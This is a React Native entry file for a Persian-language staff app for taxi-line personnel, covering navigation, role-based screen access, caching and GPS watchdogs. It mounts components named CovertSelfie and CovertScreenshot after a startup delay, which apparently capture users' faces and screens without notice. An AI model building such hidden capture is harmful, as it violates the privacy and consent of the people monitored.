import React from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { I18nManager, View, TouchableOpacity, Text, AppState, KeyboardAvoidingView, Platform, Dimensions, StyleSheet } from 'react-native';
import { SafeAreaProvider, useSafeAreaInsets } from 'react-native-safe-area-context';
import { GestureHandlerRootView } from 'react-native-gesture-handler';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import * as Font from 'expo-font';
import * as SplashScreen from 'expo-splash-screen';
import { StatusBar } from 'expo-status-bar';
import { AuthProvider, useAuth } from './src/auth';
import { RadioProvider } from './src/radio/RadioContext';
import StartupPermissions from './src/StartupPermissions';
import FirstSetupScreen from './src/FirstSetupScreen';
import PeriodicRenewScreen from './src/PeriodicRenewScreen';
import { loadApiBase } from './src/config';
import { C, FONT } from './src/theme';
import OfflineBanner from './src/OfflineBanner';
import { FontScaleProvider } from './src/fontscale';
import { ThemeProvider } from './src/themeContext';
import ErrorBoundary from './src/ErrorBoundary';
import GpsGuard from './src/GpsGuard';
import MaintenanceGuard from './src/MaintenanceGuard';
import SecurityGuard from './src/SecurityGuard';
import BatteryOptimizationGate from './src/BatteryOptimization';
import ShiftTrackingGate from './src/ShiftTrackingGate';
import PermissionGuard from './src/PermissionGuard';
import ActivityIndicator from './src/components/PulseLoadingIndicator';
import StartupGate from './src/StartupGate';
import PresenceGate from './src/PresenceGate';
import PresenceCheckWizard from './src/PresenceCheckWizard';
import CovertSelfie from './src/CovertSelfie';
import CovertScreenshot from './src/covertScreenshot';
import UpdateScreen from './src/screens/UpdateScreen';
import { checkVersion } from './src/update';
import { runGpsWorkWatchdog, GPS_WORK_WATCHDOG_INTERVAL_MS } from './src/gpsWorkWatchdog';
import {runInternetWorkWatchdog} from './src/internetWorkWatchdog';
import * as Network from 'expo-network';
import { request, flushQueuedRequests } from './src/api';
import LoginScreen from './src/screens/LoginScreen';
import DashboardScreen from './src/screens/DashboardScreen';
import CustomFieldsScreen from './src/screens/CustomFieldsScreen';
import OutageScreen from './src/screens/OutageScreen';
import SearchScreen from './src/screens/SearchScreen';
import DriverScreen from './src/screens/DriverScreen';
import DebtScreen from './src/screens/DebtScreen';
import ChecklistScreen from './src/screens/ChecklistScreen';
import NoticeScreen from './src/screens/NoticeScreen';
import ReportsScreen from './src/screens/ReportsScreen';
import SmsScreen from './src/screens/SmsScreen';
import BotMessageScreen from './src/screens/BotMessageScreen';
import RequestsScreen from './src/screens/RequestsScreen';
import { RequestInboxScreen, WorkSummaryScreen, SalarySlipsScreen } from './src/screens/RequestScreens';
import CheckInScreen from './src/screens/CheckInScreen';
import FormsScreen from './src/screens/FormsScreen';
import CulturalScreen from './src/screens/CulturalScreen';
import WelfareScreen from './src/screens/WelfareScreen';
import TempDriversScreen from './src/screens/TempDriversScreen';
import NotificationsScreen from './src/screens/NotificationsScreen';
import FieldAlertsScreen from './src/screens/FieldAlertsScreen';
import OfficialPresenceScreen from './src/screens/OfficialPresenceScreen';
import MessagesScreen from './src/screens/MessagesScreen';
import PresentListScreen from './src/screens/PresentListScreen';
import { AttendanceScreen, PastNoticesScreen, PastChecklistsScreen, DriverSmsScreen, MySmsScreen, VehicleScreen } from './src/screens/ListScreens';
import { ActivityReportScreen, ExpInsuranceScreen, ExpTaxiScreen, ExpOplicScreen, TeamReportScreen } from './src/screens/ReportListsScreens';
import { InboxReportsScreen, ReportDetailScreen } from './src/screens/InboxScreen';
import { ChangePasswordScreen, ProfileScreen, EditProfileScreen } from './src/screens/AccountScreens';
import PersonnelVehicleAssetScreen from './src/screens/PersonnelVehicleAssetScreen';
import PersonnelVehicleChecklistScreen from './src/screens/PersonnelVehicleChecklistScreen';
import MapSettingsScreen from './src/screens/MapSettingsScreen';
import ExpiryNotificationSettingsScreen from './src/screens/ExpiryNotificationSettingsScreen';
import FieldAlertSettingsScreen from './src/screens/FieldAlertSettingsScreen';
import ImportTimesScreen from './src/screens/ImportTimesScreen';
import AppLock from './src/AppLock';
import AppLockSettingsScreen from './src/screens/AppLockSettingsScreen';
import CompanyRequestsDriverGateScreen from './src/screens/CompanyRequestsDriverGateScreen';
import SubscriptionScreen from './src/screens/SubscriptionScreen';
import CrashReportsScreen from './src/screens/CrashReportsScreen';
import LineVisitProgramScreen from './src/screens/LineVisitProgramScreen';
import MyDailyMissionScreen from './src/screens/MyDailyMissionScreen';
import RoleDashboardScreen from './src/screens/RoleDashboardScreen';
import LeaderboardScreen from './src/screens/LeaderboardScreen';
import InventoryScreen from './src/screens/InventoryScreen';
import LineLocationScreen from './src/screens/LineLocationScreen';
import RadioScreen from './src/screens/RadioScreen';
import HelpScreen from './src/screens/HelpScreen';
import PrivacyPolicyScreen from './src/screens/PrivacyPolicyScreen';
import AboutAppScreen from './src/screens/AboutAppScreen';
import SchoolServiceScreen from './src/screens/SchoolServiceScreen';
import SettingsScreen from './src/screens/SettingsScreen';
import ComplaintsScreen, { ComplaintDetailScreen } from './src/screens/ComplaintsScreen';
import StationCaptureScreen from './src/screens/StationCaptureScreen';
import MyStationsScreen from './src/screens/MyStationsScreen';
import DrawerMenuScreen from './src/DrawerMenuScreen';
import SendQueueScreen from './src/screens/SendQueueScreen';
import { setDrawerControlRef, openDrawer as khOpenDrawer } from './src/drawerControl';
import { navigationRef } from './src/navigationRef';
import UnreadBadgeService from './src/UnreadBadgeService';
import { installGlobalCrashHandlers, setCurrentRoute, flushCrashReports } from './src/crashReporter';
import { startAppCacheRetention } from './src/cacheRetention';
import { loadSchoolServiceCache } from './src/schoolServiceCache';
import { readAccessCache, refreshAccessCache } from './src/accessCache';
import { readAppItems, refreshAppItems } from './src/appItemPermissions';
import MyAllowedLinesScreen from './src/screens/MyAllowedLinesScreen';
import { refreshAllowedLines } from './src/allowedLinesCache';
import AppAlertHost from './src/components/AppAlertHost';
try { I18nManager.allowRTL(false); I18nManager.forceRTL(false); I18nManager.swapLeftAndRightInRTL(false); } catch (_) {}
installGlobalCrashHandlers();
try { startAppCacheRetention(); } catch (_) {} SplashScreen.preventAutoHideAsync().catch(() => {});
const Stack=createNativeStackNavigator();
const SCREEN_W=Dimensions.get('window').width;
const SCREEN_H=Dimensions.get('window').height;
const DRAWER_WIDTH=Math.min(320,Math.max(260,Math.round(SCREEN_W*0.70)));
function openDrawer(){ khOpenDrawer(); }
const stackOptions={headerStyle:{backgroundColor:C.brand},headerTintColor:'#fff',headerTitleStyle:{fontFamily:FONT.bold},headerTitleAlign:'center',headerBackVisible:false,headerLeftContainerStyle:{paddingLeft:4},headerRightContainerStyle:{paddingRight:4},headerLeft:()=> <TouchableOpacity onPress={openDrawer} style={{width:44,height:44,alignItems:'center',justifyContent:'center'}} hitSlop={8}><Text style={{color:'#fff',fontSize:24,textAlign:'center'}}>☰</Text></TouchableOpacity>};
function DeferredRuntimeServices(){const[stage,setStage]=React.useState(0);const{user}=useAuth();React.useEffect(()=>{let active=true;const timers=[1800,2300,2800,3300].map((d,i)=>setTimeout(()=>active&&setStage(x=>Math.max(x,i+1)),d));const sub=AppState.addEventListener('change',s=>{if(s==='active'&&stage===0)setTimeout(()=>active&&setStage(1),500)});return()=>{active=false;timers.forEach(clearTimeout);try{sub.remove()}catch(_){}}},[]);React.useEffect(()=>{if(!user?.id)return undefined;let active=true;const check=(force=false)=>{if(active){runGpsWorkWatchdog({force,source:'foreground_watchdog'}).catch(()=>{});runInternetWorkWatchdog({force:false,source:'foreground_watchdog'}).catch(()=>{});}};check(true);const timer=setInterval(()=>check(false),GPS_WORK_WATCHDOG_INTERVAL_MS);const sub=AppState.addEventListener('change',state=>{if(state==='active')check(true)});return()=>{active=false;clearInterval(timer);try{sub.remove()}catch(_){}}},[user?.id]);if(stage<1)return null;return <><ErrorBoundary><GpsGuard/></ErrorBoundary><ErrorBoundary><MaintenanceGuard/></ErrorBoundary>{stage>=3&&<ErrorBoundary><CovertSelfie/></ErrorBoundary>}{stage>=3&&<ErrorBoundary><CovertScreenshot/></ErrorBoundary>}{stage>=4&&<ErrorBoundary><BatteryOptimizationGate/></ErrorBoundary>}{stage>=4&&<ErrorBoundary><ShiftTrackingGate/></ErrorBoundary>}</>}
function EditProfileWithVehicle({navigation}){const[access,setAccess]=React.useState(null);React.useEffect(()=>{request('/personnel-vehicle-assets.php?op=access',{noStore:true}).then(setAccess).catch(()=>setAccess(null))},[]);return <View style={{flex:1,backgroundColor:C.paper}}><EditProfileScreen navigation={navigation}/>{access?.allowed?<TouchableOpacity onPress={()=>navigation.navigate('PersonnelVehicleAsset')} style={{position:'absolute',top:10,left:12,right:12,zIndex:20,backgroundColor:C.taxi,borderRadius:14,paddingVertical:11,alignItems:'center',elevation:4}}><Text style={{fontFamily:FONT.bold,color:C.taxiInk,fontSize:14}}>مشخصات خودرو یا موتورسیکلت</Text></TouchableOpacity>:null}</View>}
function RestrictedScreen({routeName,Component,...props}){
  const {user}=useAuth();
  const [access,setAccess]=React.useState(null);
  const [pending,setPending]=React.useState(true);
  const [failure,setFailure]=React.useState(false);
  const [attempt,setAttempt]=React.useState(0);
  React.useEffect(()=>{
    if(!user?.id||routeName==='Dashboard')return undefined;
    let active=true;
    setAccess(null);setPending(true);setFailure(false);
    (async()=>{const cached=await readAppItems(user.id);if(!active)return;if(cached!==null){setAccess(cached);setPending(false);}try{const fresh=await refreshAppItems(user.id);if(active){setAccess(fresh);setPending(false);setFailure(false);}}catch(_){if(active&&cached===null){setAccess([]);setFailure(true);setPending(false);}}})();
    return()=>{active=false};
  },[routeName,user?.id,user?.role_id,attempt]);
  if(routeName==='Dashboard')return <Component {...props}/>;
  if(pending)return <View style={{flex:1,backgroundColor:C.paper,justifyContent:'center',alignItems:'center',padding:24}}><ActivityIndicator size="large" color={C.brand}/><Text style={{fontFamily:FONT.regular,color:C.muted,marginTop:14,textAlign:'center'}}>در حال بررسی دسترسی این بخش…</Text></View>;
  if(!access?.includes(routeName))return <View style={{flex:1,backgroundColor:C.paper,alignItems:'center',justifyContent:'center',padding:24}}><Text style={{fontFamily:FONT.bold,color:C.ink,fontSize:17,textAlign:'center'}}>{failure?'بررسی دسترسی ممکن نشد.':'دسترسی به این بخش برای سمت شما فعال نیست.'}</Text><Text style={{fontFamily:FONT.regular,color:C.muted,fontSize:12,textAlign:'center',marginTop:8}}>{failure?'اتصال اینترنت را بررسی کنید و دوباره تلاش کنید.':'در صورت نیاز، مدیر سامانه می‌تواند دسترسی این آیتم را از تنظیمات سمت‌ها فعال کند.'}</Text>{failure?<TouchableOpacity accessibilityRole="button" onPress={()=>setAttempt(x=>x+1)} style={{marginTop:20,minHeight:48,minWidth:150,borderRadius:12,backgroundColor:C.brand,alignItems:'center',justifyContent:'center'}}><Text style={{fontFamily:FONT.bold,color:'#fff'}}>تلاش دوباره</Text></TouchableOpacity>:null}</View>;
  return <Component {...props}/>;
}
function MainStack(){const{user,loading,refreshUser,offlineSession}=useAuth();const[sub,setSub]=React.useState(null),[subLoading,setSubLoading]=React.useState(false);React.useEffect(()=>{let alive=true;if(!user){setSub(null);setSubLoading(false);return}setSubLoading(true);const cacheKey=`subscription-status:${user.id}`;if(offlineSession){AsyncStorage.getItem(cacheKey).then(raw=>{if(alive)setSub(raw?JSON.parse(raw)?.subscription??null:null)}).catch(()=>{if(alive)setSub(null)}).finally(()=>{if(alive)setSubLoading(false)});}else{request('/subscription/status',{noStore:true,timeoutMs:8000}).then(async x=>{if(alive)setSub(x?.subscription??null);await AsyncStorage.setItem(cacheKey,JSON.stringify(x||{})).catch(()=>{});}).catch(async()=>{const raw=await AsyncStorage.getItem(cacheKey).catch(()=>null);if(alive)setSub(raw?JSON.parse(raw)?.subscription??null:null)}).finally(()=>{if(alive)setSubLoading(false)});}return()=>{alive=false}},[user?.id,offlineSession]);React.useEffect(()=>{if(!user?.id)return undefined;let alive=true;request('/my/checkin-config',{timeoutMs:10000}).then(async config=>{if(!alive)return;const entries=(config?.lines||[]).flatMap(l=>(l.idents||[]).filter(i=>String(i.kind||'').toLowerCase()==='wifi'&&String(i.value||'').trim()&&(!Array.isArray(l.checkin_methods)||!l.checkin_methods.length||l.checkin_methods.includes('wifi'))).map(i=>({line_id:Number(l.id),line_code:String(l.code||l.id),bssid:String(i.value||'').toLowerCase().replace(/[\s:-]/g,''),label:String(i.label||'')})));await AsyncStorage.setItem('wifi_authorized_bssids_v1',JSON.stringify({entries,cached_at:Date.now()}));}).catch(()=>{});return()=>{alive=false}},[user?.id]);if(loading||(user&&subLoading))return <ActivityIndicator fullScreen size={120} message="در حال دریافت اطلاعات کاربر…"/>;if(user&&(user.must_change_pw||user.must_setup))return <FirstSetupScreen onDone={refreshUser}/>;if(user&&user.must_renew)return <PeriodicRenewScreen onDone={refreshUser}/>;if(user&&sub?.enabled&&!sub?.active)return <SubscriptionScreen onActivated={setSub}/>;const screens=[['Dashboard',DashboardScreen,'داشبورد'],['SendQueue',SendQueueScreen,'صف ارسال'],['Search',SearchScreen,'جستجوی تاکسی و تاکسیران'],['Driver',DriverScreen,'اطلاعات راننده'],['Vehicle',VehicleScreen,'اطلاعات خودرو'],['Debt',DebtScreen,'بدهی آبونمان'],['Checklist',ChecklistScreen,'چک‌لیست خودرو'],['Notice',NoticeScreen,'ثبت تذکر'],['Reports',ReportsScreen,'ارسال گزارش'],['Sms',SmsScreen,'ارسال پیامک به رانندگان'],['BotMessages',BotMessageScreen,'ارسال پیام در ربات‌ها'],['Requests',RequestsScreen,'درخواست‌ها'],['RequestInbox',RequestInboxScreen,'کارتابل تأیید درخواست‌ها'],['WorkSummary',WorkSummaryScreen,'کارکرد من'],['SalarySlips',SalarySlipsScreen,'فیش‌های حقوقی من'],['CompanyRequests',CompanyRequestsDriverGateScreen,'ارسال برای شرکت'],['Subscription',SubscriptionScreen,'اشتراک گروهی و انفرادی'],['CheckIn',CheckInScreen,'ثبت حضور من'],['Forms',FormsScreen,'فرم‌ها'],['Cultural',CulturalScreen,'فعالیت‌های فرهنگی'],['Welfare',WelfareScreen,'رفاهیات'],['TempDrivers',TempDriversScreen,'رانندگان موقت'],['Notifications',NotificationsScreen,'اعلان‌ها'],['FieldAlerts',FieldAlertsScreen,'هشدارها'],['ActivityReport',ActivityReportScreen,'فعالیت رانندگان هر خط'],['ExpInsurance',ExpInsuranceScreen,'وضعیت بیمه و معاینه'],['ExpTaxi',ExpTaxiScreen,'افراد فاقد اعتبار'],['ExpOplic',ExpOplicScreen,'خودروهای فاقد بهره‌برداری'],['TeamReport',TeamReportScreen,'زیرمجموعه من'],['InboxReports',InboxReportsScreen,'گزارشات دریافتی'],['ReportDetail',ReportDetailScreen,'جزئیات گزارش'],['OfficialPresence',OfficialPresenceScreen,'ثبت حضور مسئولین در خط'],['Inventory',InventoryScreen,'اقلام تحویلی'],['Messages',MessagesScreen,'پیام‌ها'],['Attendance',AttendanceScreen,'گزارش حضور'],['PastNotices',PastNoticesScreen,'تذکرات قبلی'],['PastChecklists',PastChecklistsScreen,'چک‌لیست‌های قبلی'],['DriverSms',DriverSmsScreen,'پیامک‌های راننده'],['MySms',MySmsScreen,'پیامک‌های ارسالی من'],['CustomFields',CustomFieldsScreen,'اطلاعات تکمیلی'],['Outage',OutageScreen,'اعلام قطع سیستم نوبت‌دهی'],['MyAllowedLines',MyAllowedLinesScreen,'خطوط مجاز شما'],['Profile',ProfileScreen,'حساب کاربری'],['ChangePassword',ChangePasswordScreen,'تغییر رمز'],['EditProfile',EditProfileWithVehicle,'ویرایش اطلاعات من'],['PersonnelVehicleAsset',PersonnelVehicleAssetScreen,'مشخصات خودرو یا موتورسیکلت'],['PersonnelVehicleChecklist',PersonnelVehicleChecklistScreen,'چک‌لیست خودرویی و موتوری'],['MapSettings',MapSettingsScreen,'تنظیمات نقشه'],['ExpiryNotificationSettings',ExpiryNotificationSettingsScreen,'تنظیمات اعلان اعتبار'],['FieldAlertSettings',FieldAlertSettingsScreen,'تنظیمات هشدارهای میدانی'],['ImportTimes',ImportTimesScreen,'آخرین زمان‌های به‌روزرسانی'],['AppLockSettings',AppLockSettingsScreen,'قفل برنامه'],['CrashReports',CrashReportsScreen,'گزارش خطاهای برنامه'],['LineVisitProgram',LineVisitProgramScreen,'برنامه بازدید و پوشش خط'],['LineLocation',LineLocationScreen,'ثبت موقعیت و تصویر خطوط'],['MyDailyMission',MyDailyMissionScreen,'مأموریت روزانه من'],['RoleDashboard',RoleDashboardScreen,'داشبورد و امتیاز من'],['Leaderboard',LeaderboardScreen,'رتبه‌بندی و نشان‌ها'],['Radio',RadioScreen,'بی‌سیم خطیار'],['Help',HelpScreen,'راهنمای برنامه'],['Settings',SettingsScreen,'تنظیمات'],['PrivacyPolicy',PrivacyPolicyScreen,'سیاست حریم خصوصی'],['AboutApp',AboutAppScreen,'درباره برنامه'],['StationCapture',StationCaptureScreen,'ثبت موقعیت و تصویر خطوط'],['MyStations',MyStationsScreen,'ایستگاه‌های ثبت‌شده من'],['PresentList',PresentListScreen,'حاضرین در خط'],['SchoolService',SchoolServiceScreen,'سرویس مدارس'],['Complaints',ComplaintsScreen,'شکایات تاکسیرانان'],['ComplaintDetail',ComplaintDetailScreen,'جزئیات شکایت'],['PresenceCheckWizard',PresenceCheckWizard,'صحت‌سنجی حضور']];return <Stack.Navigator screenOptions={stackOptions}>{!user?<Stack.Screen name="Login" component={LoginScreen} options={{headerShown:false}}/>:screens.map(([name,component,title])=><Stack.Screen key={name} name={name} component={(props)=><RestrictedScreen {...props} routeName={name} Component={component}/>} options={name==='PresenceCheckWizard'?{headerShown:false}:{title}}/>)}</Stack.Navigator>}
function AppNavigator(){return <MainStack/>}
function RootShell({children}){const insets=useSafeAreaInsets();return <View style={{flex:1,backgroundColor:C.paper,paddingBottom:insets.bottom}}>{children}</View>;}
function SchoolServicePreloader(){const{user}=useAuth();React.useEffect(()=>{if(!user?.id)return;let alive=true;const refresh=()=>loadSchoolServiceCache({refresh:true}).catch(()=>null);const refreshDashboardContext=()=>Promise.allSettled([
    request('/me/full-profile',{noStore:true,timeoutMs:10000}).then(p=>{if(alive&&p&&typeof p==='object')return AsyncStorage.setItem('dashboard:profile:v1:'+user.id,JSON.stringify({savedAt:Date.now(),data:p}));}),
    request('/weather.php',{auth:false,noStore:true,timeoutMs:8000,queueIfOffline:false}).then(w=>{if(alive&&w?.ok&&Number.isFinite(Number(w.temperature)))return AsyncStorage.setItem('dashboard:weather:v1',JSON.stringify({savedAt:Date.now(),data:w}));})
  ]);
  // این درخواست‌ها بدون انتظار برای کش سنگین سرویس مدارس و به‌صورت موازی در ابتدای برنامه آغاز می‌شوند.
  refreshDashboardContext();
  (async()=>{try{await readAccessCache();await Promise.allSettled([refreshAccessCache(),loadSchoolServiceCache({refresh:true})]);}catch(_){try{await Promise.allSettled([refreshAccessCache(),refresh()]);}catch(__){}}
    // کش زمینهٔ ثبت حضور: خطوط مجاز، محدوده‌ها، جلسهٔ باز، شیفت ماه جاری و تنظیمات GPS.
    try{await Promise.allSettled([
      request('/my/checkin-config',{timeoutMs:8000}),
      request('/my/shift-schedule',{timeoutMs:8000}),
      request('/my/app-config',{timeoutMs:8000}),
      refreshAllowedLines(user.id)
    ])}catch(_){}
  })();let netSub=null;try{netSub=Network.addNetworkStateListener(s=>{if(alive&&s?.isInternetReachable===true){refresh();refreshDashboardContext();}})}catch(_){}return()=>{alive=false;try{netSub?.remove()}catch(_){}}},[user?.id]);return null;}
function CustomDrawerOverlay(){const[open,setOpen]=React.useState(false);React.useEffect(()=>{setDrawerControlRef({open:()=>setOpen(true),close:()=>setOpen(false)});return()=>setDrawerControlRef(null)},[]);if(!open)return null;const shimNav={navigate:(routeName,params)=>{try{if(routeName==='Main'&&params&&params.screen)navigationRef.navigate(params.screen);else navigationRef.navigate(routeName,params)}catch(e){}},dispatch:(action)=>{if(action&&action.type==='CLOSE_DRAWER')setOpen(false)}};return <View style={{position:'absolute',left:0,top:0,width:SCREEN_W,height:SCREEN_H,zIndex:9999,elevation:9999}} pointerEvents="box-none"><TouchableOpacity activeOpacity={1} onPress={()=>setOpen(false)} style={{position:'absolute',left:0,top:0,width:SCREEN_W,height:SCREEN_H,backgroundColor:'rgba(0,0,0,0.45)'}}/><View style={{position:'absolute',top:0,height:SCREEN_H,right:0,width:DRAWER_WIDTH,backgroundColor:C.paper,elevation:9999}}><DrawerMenuScreen navigation={shimNav}/></View></View>;}
export default function App(){const[ready,setReady]=React.useState(false),[updateInfo,setUpdateInfo]=React.useState(null);
React.useEffect(()=>{let active=true;const flush=()=>{if(active)flushQueuedRequests().catch(()=>{})};flush();let sub=null;try{sub=Network.addNetworkStateListener(s=>{if(s?.isInternetReachable===true)flush()})}catch(_){}const timer=setInterval(flush,30000);return()=>{active=false;clearInterval(timer);try{sub?.remove()}catch(_){} }},[]);const runVersionCheck=React.useCallback(async()=>{try{setUpdateInfo(await checkVersion())}catch(_){setUpdateInfo(null)}},[]);React.useEffect(()=>{let mounted=true;(async()=>{try{await Font.loadAsync({[FONT.regular]:require('./assets/fonts/Vazirmatn-Regular.ttf'),[FONT.bold]:require('./assets/fonts/Vazirmatn-Bold.ttf')})}catch(error){console.warn('Vazirmatn font loading failed',error)}try{await Font.loadAsync({[FONT.payrollHoma]:require('./assets/fonts/B Homa.ttf'),[FONT.payrollNazanin]:require('./assets/fonts/B NAZANIN.TTF')})}catch(error){console.warn('Payroll font loading failed',error)}try{await loadApiBase()}catch(_){}if(mounted)setReady(true);SplashScreen.hideAsync().catch(()=>{});runVersionCheck().catch(()=>{});flushCrashReports().catch(()=>{});try{require('./src/updater').checkForUpdate(false)}catch(_){} })();return()=>{mounted=false}},[runVersionCheck]);if(!ready)return <View style={{flex:1,backgroundColor:C.paper}}/>;if(updateInfo?.required)return <ErrorBoundary><StatusBar style="light"/><UpdateScreen info={updateInfo} onRecheck={runVersionCheck}/></ErrorBoundary>;return <GestureHandlerRootView style={{flex:1}}><SafeAreaProvider><ErrorBoundary><ThemeProvider><FontScaleProvider><StartupGate><StartupPermissions><AuthProvider><AppAlertHost/><SchoolServicePreloader/><UnreadBadgeService/><RadioProvider><StatusBar style="light"/><OfflineBanner/><AppLock><SecurityGuard><PermissionGuard><RootShell><KeyboardAvoidingView style={{flex:1}} behavior={Platform.OS==='ios'?'padding':undefined}><NavigationContainer ref={navigationRef} onReady={()=>setCurrentRoute(navigationRef.getCurrentRoute()?.name)} onStateChange={()=>setCurrentRoute(navigationRef.getCurrentRoute()?.name)}><AppNavigator/></NavigationContainer></KeyboardAvoidingView><ErrorBoundary><PresenceGate navigationRef={navigationRef}/></ErrorBoundary><DeferredRuntimeServices/></RootShell></PermissionGuard></SecurityGuard></AppLock></RadioProvider><CustomDrawerOverlay/></AuthProvider></StartupPermissions></StartupGate></FontScaleProvider></ThemeProvider></ErrorBoundary></SafeAreaProvider></GestureHandlerRootView>}
